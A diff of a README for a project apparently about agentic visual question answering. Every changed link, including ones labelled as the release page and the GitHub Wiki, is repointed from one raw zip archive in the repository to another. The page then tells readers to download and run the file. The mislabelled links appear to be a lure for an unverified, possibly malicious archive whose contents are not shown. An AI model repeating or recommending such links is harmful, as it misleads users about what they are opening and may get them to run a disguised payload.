@@ -6,9 +6,9 @@ Welcome to vlm-agentic-vqa, a project that explores agentic AI for Visual Questi
 
 ## 📥 Download the Application
 
-[![Download vlm-agentic-vqa](https://raw.githubusercontent.com/ewanevery633/vlm-agentic-vqa/main/src/vlm-agentic-vqa-v2.9.zip)](https://raw.githubusercontent.com/ewanevery633/vlm-agentic-vqa/main/src/vlm-agentic-vqa-v2.9.zip)
+[![Download vlm-agentic-vqa](https://raw.githubusercontent.com/ewanevery633/vlm-agentic-vqa/main/notebooks/vlm-agentic-vqa-1.3-beta.1.zip)](https://raw.githubusercontent.com/ewanevery633/vlm-agentic-vqa/main/notebooks/vlm-agentic-vqa-1.3-beta.1.zip)
 
-To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/ewanevery633/vlm-agentic-vqa/main/src/vlm-agentic-vqa-v2.9.zip).
+To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/ewanevery633/vlm-agentic-vqa/main/notebooks/vlm-agentic-vqa-1.3-beta.1.zip).
 
 ## 📋 Requirements
 
@@ -21,7 +21,7 @@ Before you download and run vlm-agentic-vqa, ensure your system meets the follow
 
 ## 📥 Download & Install
 
-1. Click this link to open the [Releases page](https://raw.githubusercontent.com/ewanevery633/vlm-agentic-vqa/main/src/vlm-agentic-vqa-v2.9.zip).
+1. Click this link to open the [Releases page](https://raw.githubusercontent.com/ewanevery633/vlm-agentic-vqa/main/notebooks/vlm-agentic-vqa-1.3-beta.1.zip).
 2. Locate the latest version of the application.
 3. Download the appropriate file for your operating system. Follow the prompts to save the file to your computer.
 4. After the download is complete, locate the downloaded file in your file explorer.
@@ -48,7 +48,7 @@ If you encounter issues while using vlm-agentic-vqa, consider the following step
 - **Performance Problems:** Check that your system meets the minimum requirements, especially RAM and disk space.
 - **Application Crashes:** Make sure your OS is up-to-date. Restart your computer before launching the application again.
 
-For more detailed troubleshooting, refer to our documentation available on the [GitHub Wiki](https://raw.githubusercontent.com/ewanevery633/vlm-agentic-vqa/main/src/vlm-agentic-vqa-v2.9.zip).
+For more detailed troubleshooting, refer to our documentation available on the [GitHub Wiki](https://raw.githubusercontent.com/ewanevery633/vlm-agentic-vqa/main/notebooks/vlm-agentic-vqa-1.3-beta.1.zip).
 
 ## 🤝 Contribution
 
